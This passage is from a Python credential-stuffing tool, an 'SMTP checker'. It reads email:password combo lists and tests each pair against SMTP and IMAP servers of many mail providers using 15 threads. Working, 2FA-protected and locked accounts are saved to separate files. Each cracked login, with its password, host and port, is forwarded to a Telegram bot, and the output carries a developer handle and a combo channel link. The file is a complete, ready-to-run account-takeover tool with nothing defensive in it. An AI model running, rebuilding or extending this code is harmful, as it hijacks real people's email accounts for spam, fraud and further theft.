    'stc.com.sa': ('imap.stc.com.sa', 993),
    'mobily.com.sa': ('imap.mobily.com.sa', 993),
    'zain.com': ('imap.zain.com', 993),
    'rediffmail.com': ('imap.rediffmail.com', 993),
    'indiatimes.com': ('imap.indiatimes.com', 993),
    'sify.com': ('imap.sify.com', 993),
    'vsnl.com': ('imap.vsnl.com', 993),
    'airtelmail.com': ('imap.airtelmail.com', 993),
    'airtel.in': ('imap.airtel.in', 993),
    'jio.com': ('imap.jio.com', 993),
    'jio.in': ('imap.jio.in', 993),
    'tatatel.in': ('imap.tatatel.in', 993),
    'yahoo.com.pk': ('imap.mail.yahoo.com', 993),
    'hotmail.com.pk': ('outlook.office365.com', 993),
    'yahoo.com.bd': ('imap.mail.yahoo.com', 993),
    'gmail.com.bd': ('imap.gmail.com', 993),
    'yahoo.lk': ('imap.mail.yahoo.com', 993),
    'gmail.lk': ('imap.gmail.com', 993),
    'yahoo.com.np': ('imap.mail.yahoo.com', 993),
    'gmail.com.np': ('imap.gmail.com', 993),
    'bigpond.com': ('imap.bigpond.com', 993),
    'bigpond.net.au': ('imap.bigpond.com', 993),
    'optusnet.com.au': ('imap.optusnet.com.au', 993),
    'iinet.net.au': ('imap.iinet.net.au', 993),
    'telstra.com': ('imap.telstra.com', 993),
    'tpg.com.au': ('imap.tpg.com.au', 993),
    'xtra.co.nz': ('imap.xtra.co.nz', 993),
    'vodafone.co.nz': ('imap.vodafone.co.nz', 993),
    'spark.co.nz': ('imap.spark.co.nz', 993),
    'orcon.net.nz': ('imap.orcon.net.nz', 993),
    'bell.net': ('imap.bell.net', 993),
    'rogers.com': ('imap.rogers.com', 993),
    'sympatico.ca': ('imap.sympatico.ca', 993),
    'telus.net': ('imap.telus.net', 993),
    'shaw.ca': ('imap.shaw.ca', 993),
    'videotron.ca': ('imap.videotron.ca', 993),
    'webmail.co.za': ('imap.webmail.co.za', 993),
    'vodamail.co.za': ('imap.vodamail.co.za', 993),
    'mtnloaded.co.za': ('imap.mtnloaded.co.za', 993),
    'telkomsa.net': ('imap.telkomsa.net', 993),
    'yahoo.com.eg': ('imap.mail.yahoo.com', 993),
    'gmail.com.eg': ('imap.gmail.com', 993),
    'link.net.eg': ('imap.link.net.eg', 993),
    'yahoo.co.ma': ('imap.mail.yahoo.com', 993),
    'gmail.co.ma': ('imap.gmail.com', 993),
    'yahoo.com.tn': ('imap.mail.yahoo.com', 993),
    'gmail.com.tn': ('imap.gmail.com', 993),
    'yahoo.dz': ('imap.mail.yahoo.com', 993),
    'gmail.dz': ('imap.gmail.com', 993),
    'yahoo.com.ng': ('imap.mail.yahoo.com', 993),
    'gmail.com.ng': ('imap.gmail.com', 993),
    'yahoo.co.ke': ('imap.mail.yahoo.com', 993),
    'gmail.co.ke': ('imap.gmail.com', 993),
    'yahoo.com.gh': ('imap.mail.yahoo.com', 993),
    'gmail.com.gh': ('imap.gmail.com', 993),
    'protonmail.com': ('127.0.0.1', 143),
    'proton.me': ('127.0.0.1', 143),
    'tutanota.com': ('mail.tutanota.com', 993),
    'tuta.io': ('mail.tutanota.com', 993),
    'startmail.com': ('imap.startmail.com', 993),
    'fastmail.com': ('imap.fastmail.com', 993),
    'runbox.com': ('imap.runbox.com', 993),
    'mailfence.com': ('imap.mailfence.com', 993),
    'countermail.com': ('imap.countermail.com', 993),
    'posteo.de': ('imap.posteo.de', 993),
    'kolabnow.com': ('imap.kolabnow.com', 993),
    'mailbox.org': ('imap.mailbox.org', 993),
    'ctemplar.com': ('imap.ctemplar.com', 993),
    'disroot.org': ('imap.disroot.org', 993),
    'company.com': ('imap.gmail.com', 993),
    'corp.com': ('imap.gmail.com', 993),
}

def get_mx_smtp(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_hosts = [str(r.exchange).rstrip('.') for r in answers]
        if mx_hosts:
            return mx_hosts[0]
    except:
        pass
    return f"smtp.{domain}"

def detect_smtp_server(email):
    domain = email.split('@')[-1].lower()
    if domain in SMTP_SERVERS:
        return SMTP_SERVERS[domain]
    mx = get_mx_smtp(domain)
    return (mx, [587, 465, 25])

def check_smtp(email, password, timeout=10):
    host, ports = detect_smtp_server(email)
    for port in ports:
        try:
            if port == 465:
                server = smtplib.SMTP_SSL(host, port, timeout=timeout)
                server.ehlo()
            else:
                server = smtplib.SMTP(host, port, timeout=timeout)
                server.ehlo()
                if port == 587:
                    server.starttls()
                    server.ehlo()
            server.login(email, password)
            server.quit()
            return 'hit', host, port
        except smtplib.SMTPAuthenticationError as e:
            err = str(e).lower()
            if "2fa" in err or "two-factor" in err or "app password" in err:
                return '2fa', host, port
            elif "locked" in err or "blocked" in err:
                return 'locked', host, port
            else:
                return 'smtp_fail', host, port
        except:
            continue
    return 'smtp_fail', host, 0

def get_imap_server(email):
    domain = email.split('@')[-1].lower()
    if domain in IMAP_SERVERS:
        server, port = IMAP_SERVERS[domain]
        return server, port
    return (f"imap.{domain}", 993)

def check_imap(email, password, timeout=10):
    try:
        server, port = get_imap_server(email)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        imap = imaplib.IMAP4_SSL(host=server, port=port, ssl_context=context, timeout=timeout)
        imap.login(email, password)
        imap.select('INBOX')
        imap.logout()
        return True
    except imaplib.IMAP4.error as e:
        err = str(e).lower()
        if "authenticationfailed" in err or "login failed" in err:
            return False
        elif "2fa" in err or "two-factor" in err:
            return '2fa'
        elif "locked" in err or "blocked" in err:
            return 'locked'
        else:
            return False
    except:
        return False

def add_recent_activity(text, color="white"):
    timestamp = time.strftime("%H:%M:%S")
    line = f"[{timestamp}] {text}"
    recent_activities.append(line)
    if len(recent_activities) > 10:   # زدنا من 5 إلى 10
        recent_activities.pop(0)

def save_smtp_hit(host, port, email, password):
    with open(SMTP_HITS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{host}|{port}|{email}|{password}\n")

def save_valid_no_smtp(email, password):
    with open(VALID_NO_SMTP_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

def save_2fa(email, password):
    with open(TWOFA_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

def save_locked(email, password):
    with open(LOCKED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

def send_telegram(bot_token, chat_id, hit_number, email, password, host, port):
    try:
        import telebot
        bot = telebot.TeleBot(bot_token)
        text = (
        f"<blockquote><b>✨ New Hit SMTP #{hit_number}</b></blockquote>\n\n"
        f"<blockquote><b>📧 Email:</b> {email}</blockquote>\n"
        f"<blockquote><b>🔑 Password:</b> {password}</blockquote>\n"
        f"<blockquote><b>🌐 Host:</b> {host}</blockquote>\n"
        f"<blockquote><b>📡 Port:</b> {port}</blockquote>\n"
        f"<blockquote><b>👨‍💻 Dev:</b> @murphython</blockquote>\n"
        f"<blockquote><b>📢 Channel:</b> "
        f"<a href='https://t.me/+zZUKD1RHroA5ODc8'>coمبوz</a></blockquote>"
)
        bot.send_message(chat_id, text, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        console.print(f"[red]Telegram error: {e}[/red]")

def worker(combo, send_tg, bot_token, chat_id):
    global hit_counter
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RED = '\033[91m'
    RESET = '\033[0m'
    try:
        if ':' not in combo:
            with stats_lock:
                stats["checked"] += 1
                stats["bad"] += 1
            return
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        if '@' not in email:
            with stats_lock:
                stats["checked"] += 1
                stats["bad"] += 1
            return

        smtp_status, host, port = check_smtp(email, password)
        
        if smtp_status == 'hit':
            with stats_lock:
                stats["checked"] += 1
                stats["hit"] += 1
                hit_counter += 1
            save_smtp_hit(host, port, email, password)
            add_recent_activity(f"{GREEN}HIT (SMTP)  |{GREEN} {host}|{port}|{email}{RESET}", "green")
            if send_tg and bot_token and chat_id:
                send_telegram(bot_token, chat_id, hit_counter, email, password, host, port)
            return
        elif smtp_status == '2fa':
            with stats_lock:
                stats["checked"] += 1
                stats["twofa"] += 1
            save_2fa(email, password)
            add_recent_activity(f"{YELLOW}2FA  | {email}{RESET}", "yellow")
            return
        elif smtp_status == 'locked':
            with stats_lock:
                stats["checked"] += 1
                stats["locked"] += 1
            save_locked(email, password)
            add_recent_activity(f"{RED}LOCKED | {email}{RESET}", "red")
            return
        
        # SMTP failed -> try IMAP
        imap_result = check_imap(email, password)
        if imap_result == True:
            with stats_lock:
                stats["checked"] += 1
                stats["valid"] += 1
            save_valid_no_smtp(email, password)
            add_recent_activity(f"{CYAN}VALID (no SMTP) | {email}{RESET}", "cyan")
        elif imap_result == '2fa':
            with stats_lock:
                stats["checked"] += 1
                stats["twofa"] += 1
            save_2fa(email, password)
            add_recent_activity(f"{YELLOW}2FA  | {email}{RESET}", "yellow")
        elif imap_result == 'locked':
            with stats_lock:
                stats["checked"] += 1
                stats["locked"] += 1
            save_locked(email, password)
            add_recent_activity(f"{RED}LOCKED | {email}{RESET}", "red")
        else:
            with stats_lock:
                stats["checked"] += 1
                stats["bad"] += 1
            add_recent_activity(f"{RED}BAD  | {email}", "red")
    except Exception:
        with stats_lock:
            stats["checked"] += 1
            stats["bad"] += 1

def load_combos(file_path):
    combos = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                combos.append(line)
    return combos

def main():
    from cfonts import render
    Smtp_logo = render('SMTP', 
                   colors=['cyan', 'blue'], 
                   align='center', 
                   font='block')

    console.print(Panel(Align.center(Text(f"{Smtp_logo}", style="bold cyan")), border_style="cyan"))
    console.print(Align.center(Text("Telegram: t.me/Murphython", style="yellow")))

    combo_path = input(Fore.CYAN + "[?] Enter combo file path (email:password): " + Style.RESET_ALL).strip().strip('"')
    if not os.path.exists(combo_path):
        console.print(f"[red]File not found: {combo_path}[/red]")
        return

    threads = 15

    tg_input = input(Fore.CYAN + "[?] Enable Telegram notifications? (y/n): " + Style.RESET_ALL).strip().lower()
    send_tg = tg_input == 'y'
    bot_token = None
    chat_id = None
    if send_tg:
        try:
            import telebot
        except ImportError:
            console.print("[yellow]Telebot not installed. Install with: pip install telebot[/yellow]")
            send_tg = False
        else:
            bot_token = input(Fore.CYAN + "🤖 Bot Token: " + Style.RESET_ALL).strip()
            chat_id = input(Fore.CYAN + "💬 Chat ID: " + Style.RESET_ALL).strip()
            os.system("clear")

    combos = load_combos(combo_path)
    if not combos:
        console.print("[red]No valid combos (email:pass)[/red]")
        return

    stats["total"] = len(combos)
    stats["start_time"] = time.time()
    console.print(f"[white]Output: {OUTPUT_DIR}[/white]")
    console.print(f"[green]Loaded {stats['total']} combos. Threads: {threads}[/green]\n")

    # ------------------------------------------------------------
    # الدالة المعدلة التي تجعل منطقة النشاط أكبر والكتابة في المنتصف
    # ------------------------------------------------------------
    def generate_layout():
        elapsed = time.time() - stats["start_time"]
        if elapsed < 0.001:
            elapsed = 0.001

        stats_table = Table(show_header=False, box=None)
        stats_table.add_column("", style="bold cyan")
        stats_table.add_column("", style="white")
        stats_table.add_row("Checked", f"{stats['checked']}/{stats['total']}")
        stats_table.add_row("HIT (SMTP)", f"[green]{stats['hit']}[/green]")
        stats_table.add_row("VALID (no SMTP)", f"[cyan]{stats['valid']}[/cyan]")
        stats_table.add_row("2FA", f"[yellow]{stats['twofa']}[/yellow]")
        stats_table.add_row("LOCKED", f"[red]{stats['locked']}[/red]")
        stats_table.add_row("BAD", f"[red]{stats['bad']}[/red]")

        progress = Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
        )
        task = progress.add_task("Checking Progress", total=stats["total"])
        progress.update(task, completed=stats["checked"])

        # نص النشاط - نأخذ آخر 10 أسطر (بدلاً من 5)
        activity_text = "\n".join(recent_activities[-10:]) if recent_activities else "No activity yet."

        # لوحة النشاط مع توسيط النص وحجم أكبر
        activity_panel = Panel(
            Align(activity_text, align="center", vertical="middle"),
            title="📋 Recent Activity",
            border_style="cyan",
            padding=(1, 2)   # إضافة مسافة داخلية
        )

        layout = Layout()
        layout.split_column(
            Layout(name="stats", size=8),
            Layout(name="progress", size=3),
            Layout(name="activity", size=15),   # زيادة الحجم من 8 إلى 15
        )
        layout["stats"].update(stats_table)
        layout["progress"].update(progress)
        layout["activity"].update(activity_panel)
        return layout

    with Live(generate_layout(), refresh_per_second=4, console=console) as live:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo, send_tg, bot_token, chat_id) for combo in combos]
            for future in as_completed(futures):
                live.update(generate_layout())

    console.print("\n[bold green]✓ Check completed![/bold green]")
    console.print(f"[green]SMTP Hits saved: {SMTP_HITS_FILE}[/green]")
    console.print(f"[cyan]Valid (no SMTP) saved: {VALID_NO_SMTP_FILE}[/cyan]")
    if stats["twofa"] > 0:
        console.print(f"[yellow]2FA saved: {TWOFA_FILE}[/yellow]")
    if stats["locked"] > 0:
        console.print(f"[red]Locked saved: {LOCKED_FILE}[/red]")

    input(Fore.YELLOW + "\nPress Enter to exit..." + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted by user[/red]")
    except Exception as e:
        console.print(f"\n[red]Error: {e}[/red]")